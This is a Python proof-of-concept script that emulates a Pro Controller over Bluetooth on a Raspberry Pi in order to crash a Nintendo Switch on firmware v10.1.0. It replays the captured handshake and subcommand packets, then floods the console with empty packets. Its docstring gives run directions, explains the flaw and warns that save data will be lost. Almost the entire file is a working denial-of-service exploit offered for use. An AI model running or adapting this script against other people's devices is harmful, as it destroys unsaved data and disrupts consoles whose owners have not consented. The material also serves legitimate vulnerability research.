"""
---------------------------------------------------
--> THIS SCRIPT WILL CRASH YOUR NINTENDO SWITCH <--
---------------------------------------------------

Any save data or active game state will be lost
since this forces a restart. I take no
responsibility whatsoever for any lost data or
harm caused by this script.

RUN THIS AT YOUR OWN RISK!

---------------------------------------------------
DIRECTIONS FOR USE
---------------------------------------------------

This script was tested with a Raspberry Pi 4B (4GB),
Python 3.7.3, and a Nintendo Switch on firmware v10.1.0

1.) Open the "Change Grip/Order" menu on your
Nintendo Switch.
2.) Start this script with sudo privileges.
3.) Watch your Switch crash.

---------------------------------------------------
HOW DOES THIS WORK?
---------------------------------------------------

The Switch protects itself against malformed
packets when controllers initially connect. This
defensiveness, however, is dropped after a
controller successfully connects to the Switch.

After a successful connection, we can exploit this
by blasting the Switch with malformed (specifically
empty) packets. Since the Switch isn't expecting this,
we trigger a cascade of errors, resulting in the
crash.
"""

import socket
import sys
import os
import time
import fcntl

from nxbt import toggle_clean_bluez
from nxbt import BlueZ
from nxbt import Controller
from nxbt import PRO_CONTROLLER

REQUEST_INFO = b'\xA2\x21\x1A\x40\x00\x00\x00\x02\x20\x00\x01\x00\x00\x00\x82\x02\x03\x48\x03\x02\xDC\xA6\x32\x16\x4A\x7C\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
SET_SHIPMENT = b'\xA1\x21\xF2\x40\x00\x00\x00\x10\x18\x76\x44\x97\x73\x0B\x80\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
SERIAL_NUMBER = b'\xA1\x21\x00\x40\x00\x00\x00\x12\x08\x76\x42\x77\x73\x0C\x90\x10\x00\x60\x00\x00\x10\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
COLOURS = b'\xA1\x21\x26\x40\x00\x00\x00\x11\xF8\x75\x44\x87\x73\x0C\x90\x10\x50\x60\x00\x00\x0D\x32\x32\x32\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
INPUT_MODE = b'\xA1\x21\x5B\x40\x00\x00\x00\x10\x18\x76\x45\x87\x73\x0C\x80\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
TRIGGER_BUTTONS = b'\xA1\x21\xAA\x40\x00\x00\x00\x11\x08\x76\x44\x87\x73\x0B\x83\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
FACTORY_PARAMS = b'\xA1\x21\xEE\x40\x00\x00\x00\x10\xD8\x75\x43\x87\x73\x0C\x90\x10\x80\x60\x00\x00\x18\x50\xFD\x00\x00\xC6\x0F\x0F\x30\x61\x96\x30\xF3\xD4\x14\x54\x41\x15\x54\xC7\x79\x9C\x33\x36\x63\x00\x00\x00\x00\x00'
FACTORY_PARAMS_2 = b'\xA1\x21\x15\x40\x00\x00\x00\x11\x18\x76\x45\x97\x73\x0B\x90\x10\x98\x60\x00\x00\x12\x0F\x30\x61\x96\x30\xF3\xD4\x14\x54\x41\x15\x54\xC7\x79\x9C\x33\x36\x63\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
USER_CAL = b'\xA1\x21\x49\x40\x00\x00\x00\x12\x08\x76\x43\xA7\x73\x0A\x90\x10\x10\x80\x00\x00\x18\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x00'
FACTORY_CAL = b'\xA1\x21\x65\x40\x00\x00\x00\x0F\x38\x76\x46\x87\x73\x0A\x90\x10\x3D\x60\x00\x00\x19\x31\x96\x61\xEA\xE7\x73\xA4\xF5\x5D\x55\x27\x75\xA7\xD5\x5B\x3A\x16\x59\xFF\x32\x32\x32\xFF\xFF\xFF\x00\x00\x00\x00'
SIX_AXIS_CAL = b'\xA1\x21\x8D\x40\x00\x00\x00\x10\x08\x76\x44\x67\x73\x08\x90\x10\x20\x60\x00\x00\x18\x32\x00\xFA\xFE\x38\x01\x00\x40\x00\x40\x00\x40\x03\x00\xEE\xFF\xD9\xFF\x3B\x34\x3B\x34\x3B\x34\x00\x00\x00\x00\x00'
ENABLE_IMU = b'\xA1\x21\xBB\x40\x00\x00\x00\x11\x08\x76\x45\x87\x73\x02\x80\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
ENABLE_VIBRATION = b'\xA1\x21\xDD\x40\x00\x00\x00\x0F\x18\x76\x43\x87\x73\x09\x80\x48\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
SET_NFC_IR = b'\xA1\x21\x13\x40\x00\x00\x00\x0E\x08\x76\x45\x77\x73\x00\xA0\x21\x01\x00\xFF\x00\x03\x00\x05\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x5C'
SET_PLAYER_LIGHTS = b'\xA1\x21\x35\x40\x00\x00\x00\x10\x08\x76\x43\x67\x73\x0B\x80\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

IDLE_PACKET = b'\xA1\x30\xBA\x40\x00\x00\x00\x0F\xD8\x75\x43\x97\x73\x09\xD5\xFA\x3C\xFC\xCD\x0E\x19\x00\xE1\xFF\xDD\xFF\xCD\xFA\x3A\xFC\xCE\x0E\x18\x00\xDF\xFF\xDB\xFF\xCA\xFA\x3C\xFC\xD3\x0E\x19\x00\xDD\xFF\xDB\xFF'

COMMANDS = [
    REQUEST_INFO,
    SET_SHIPMENT,
    SERIAL_NUMBER,
    COLOURS,
    INPUT_MODE,
    TRIGGER_BUTTONS,
    FACTORY_PARAMS,
    FACTORY_PARAMS_2,
    USER_CAL,
    FACTORY_CAL,
    SIX_AXIS_CAL,
    ENABLE_IMU,
    ENABLE_VIBRATION,
    SET_NFC_IR,
]


def format_message(data, split, name):
    """Formats a given byte message in hex format split
    into payload and subcommand sections.

    :param data: A series of bytes
    :type data: bytes
    :param split: The location of the payload/subcommand split
    :type split: integer
    :param name: The name featured in the start/end messages
    :type name: string
    :return: The formatted data
    :rtype: string
    """

    payload = ""
    subcommand = ""
    for i in range(0, len(data)):
        data_byte = str(hex(data[i]))[2:].upper()
        if len(data_byte) < 2:
            data_byte = "0" + data_byte
        if i <= split:
            payload += "0x" + data_byte + " "
        else:
            subcommand += "0x" + data_byte + " "

    formatted = (
        f"--- {name} Msg ---\n" +
        f"Payload:    {payload}\n" +
        f"Subcommand: {subcommand}")

    return formatted


def print_msg_controller(data):
    """Prints a formatted message from a controller

    :param data: The bytes from the controller message
    :type data: bytes
    """

    print(format_message(data, 13, "Controller"))


def print_msg_switch(data):
    """Prints a formatted message from a Switch

    :param data: The bytes from the Switch message
    :type data: bytes
    """

    print(format_message(data, 10, "Switch"))


if __name__ == "__main__":
    port_ctrl = 17
    port_itr = 19

    toggle_clean_bluez(False)
    bt = BlueZ(adapter_path="/org/bluez/hci0")

    controller = Controller(bt, PRO_CONTROLLER)
    controller.setup()

    # Switch sockets
    switch_itr = socket.socket(family=socket.AF_BLUETOOTH,
                               type=socket.SOCK_SEQPACKET,
                               proto=socket.BTPROTO_L2CAP)
    switch_ctrl = socket.socket(family=socket.AF_BLUETOOTH,
                                type=socket.SOCK_SEQPACKET,
                                proto=socket.BTPROTO_L2CAP)

    try:
        switch_ctrl.bind((bt.address, port_ctrl))
        switch_itr.bind((bt.address, port_itr))

        # bt.set_alias("Joy-Con (L)")
        bt.set_alias("Pro Controller")
        bt.set_discoverable(True)

        print("Waiting for Switch to connect...")
        switch_itr.listen(1)
        switch_ctrl.listen(1)

        client_control, control_address = switch_ctrl.accept()
        print("Got Switch Control Client Connection")
        client_interrupt, interrupt_address = switch_itr.accept()
        print("Got Switch Interrupt Client Connection")

        # Creating a non-blocking client interrupt connection
        fcntl.fcntl(client_interrupt, fcntl.F_SETFL, os.O_NONBLOCK)

        print("Connecting to Switch...")
        while True:
            try:
                reply = client_interrupt.recv(350)
                # print_msg_switch(reply)
            except BlockingIOError:
                reply = None

            if reply and len(reply) > 40:
                client_interrupt.sendall(COMMANDS.pop(0))
            else:
                client_interrupt.sendall(IDLE_PACKET)

            if len(COMMANDS) == 0:
                break

            time.sleep(1/15)

        print("Crashing Switch...")
        while True:
            try:
                reply = client_interrupt.recv(350)
            except BlockingIOError:
                reply = None

            client_interrupt.sendall(b'')

            time.sleep(1/15)

    except KeyboardInterrupt:
        print("Closing sockets")

        switch_itr.close()
        switch_ctrl.close()

        try:
            sys.exit(1)
        except SystemExit:
            os._exit(1)

    except OSError as e:
        print("Closing sockets")

        switch_itr.close()
        switch_ctrl.close()

        raise e

    finally:
        toggle_clean_bluez(True)
